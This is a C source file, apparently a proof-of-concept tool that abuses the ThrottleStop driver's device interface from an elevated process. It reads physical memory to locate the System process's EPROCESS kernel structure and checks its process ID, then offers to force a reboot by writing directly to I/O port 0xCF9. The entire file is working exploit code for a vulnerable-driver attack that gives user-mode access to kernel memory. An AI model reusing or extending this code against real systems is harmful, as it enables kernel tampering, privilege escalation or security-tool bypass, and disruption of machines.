#include "EProcess.h"
#include <stdio.h>

HANDLE g_hDevice = INVALID_HANDLE_VALUE;

void error(const char* msg) {
    printf("Error: %s (code: %lu)\n", msg, GetLastError());
    ExitProcess(1);
}

BOOL IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        error("OpenProcessToken failed");

    TOKEN_ELEVATION elevation;
    DWORD size = sizeof(TOKEN_ELEVATION);
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        error("GetTokenInformation failed");
    }

    CloseHandle(hToken);
    return elevation.TokenIsElevated;
}

int main() {
    if (!IsElevated()) {
        printf("This program requires elevated privileges. Please run as administrator.\n");
        return 1;
    }

    g_hDevice = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hDevice == INVALID_HANDLE_VALUE) {
		error("Failed to open ThrottleStop device handle");
    }

    NTSTATUS status = BuildMemoryMap();
    if (!NT_SUCCESS(status)) {
        printf("Failed to build memory map: 0x%X\n", status);
        return 1;
    }

    ULONGLONG systemEPROCESS = GetEprocessFromPid(4);
    if (systemEPROCESS == 0) {
        printf("Failed to get EPROCESS for system process.\xA");
        return 1;
    }

    const int UniqueProcessId = 0x1D0;
    DWORD systemProcessId = 0;
    if (!ReadPhysicalMemoryDword(vtop(systemEPROCESS + UniqueProcessId), &systemProcessId)) {
        printf("Failed to read UniqueProcessId from system process.\xA");
        return 1;
    }

    printf("System process ID obtained from EPROCESS: %lu\n", systemProcessId);
    printf("System process ID %s match expected value.\n", (systemProcessId == 4) ? "does" : "doesn't");

    printf("\nDo you want to force restart the system? (y/n): ");
    char ch;
    scanf_s("%c", &ch, 1);
    if (ch == 'y' || ch == 'Y') {
        WriteIoPortByte(0xCF9, 0x0E);
		printf("Restart command sent. You are not supposed to see this, if you are then there's something off.\n");
    }
    FreeMemoryMaps();
    CloseHandle(g_hDevice);
}
